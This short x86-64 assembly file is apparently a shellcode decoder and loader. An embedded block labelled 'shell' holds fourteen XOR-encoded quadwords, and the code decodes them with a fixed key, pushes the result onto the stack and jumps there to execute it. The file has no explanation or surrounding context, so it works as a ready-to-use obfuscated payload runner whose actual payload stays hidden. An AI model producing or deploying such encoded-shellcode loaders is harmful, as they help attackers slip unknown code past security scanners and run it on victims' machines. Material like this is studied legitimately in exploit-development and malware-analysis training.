global _start 

section .data
  shell:  
     dq 0xd74bde7c5cee84a2
     dq 0x9a84100511dd5a93
     dq 0x7569ab9d9ab210
     dq 0x9a45960debe30c20
     dq 0x62841005e3304ce6
     dq 0x510c3e7c5c35cd69
     dq 0xd685a184259a6565
     dq 0x506c6c5000ff69
     dq 0x815650aa34e42731
     dq 0x48ff691e57a5f26a
     dq 0xe60907f2af9a176d
     dq 0xc9f15b3152f1e39a
     dq 0x9a170009bbb43a37
     dq 0xa3a29a0544127569
     dq 0xffffffffffffffff

section .text

_start:

  mov rbx, 0xd244214d14d24421
  mov rsi, shell

while_rax_ne_0xff:
  mov rax, [rsi]
  cmp rax, 0xffffffffffffffff
  je while_rax_ne_0xff_done
  xor rax, rbx
  push rax
  add rsi, 8
  jmp while_rax_ne_0xff
   
while_rax_ne_0xff_done:
  jmp rsp
